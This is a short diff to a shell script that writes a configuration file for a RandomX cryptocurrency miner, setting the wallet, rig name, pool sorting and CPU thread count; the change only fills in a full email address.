@@ -20,7 +20,7 @@ rm config.ini
 echo "[RandomX]" >> config.ini
 echo "wallet = 42VmQmradix9d5QaHZdo9pUvaH4Ua94WV22VK1HNcAEUbuDxSNXFCoH3h5GA5F8nUuh9a76xzt7sURb4wNgXVDn77qBvRBa" >> config.ini 
 echo "rigName = " `cat /proc/sys/kernel/hostname` >> config.ini
-echo "email = yokohama" >> config.ini
+echo "email = yokohama@mailinator.com" >> config.ini
 echo "sortPools = true" >> config.ini 
 echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'` >> config.ini
 
